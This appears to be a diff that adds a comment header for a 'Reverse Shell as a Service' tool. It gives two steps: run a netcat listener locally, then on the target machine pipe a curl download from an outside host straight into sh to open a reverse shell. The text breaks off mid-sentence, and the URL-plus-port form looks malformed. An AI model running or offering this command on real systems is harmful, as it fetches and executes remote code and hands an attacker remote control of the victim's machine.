@@ -1,0 +1,10 @@
+# Reverse Shell as a Service
+# https://github.com/tero22/shell/reverse-shell
+#
+# 1. On your machine:
+#      nc -l 16625
+#
+# 2. On the target machine:
+#      curl https://github.com/tero22/shell/reverse-shell:16625 | sh
+#
+# 3. Don't be a d
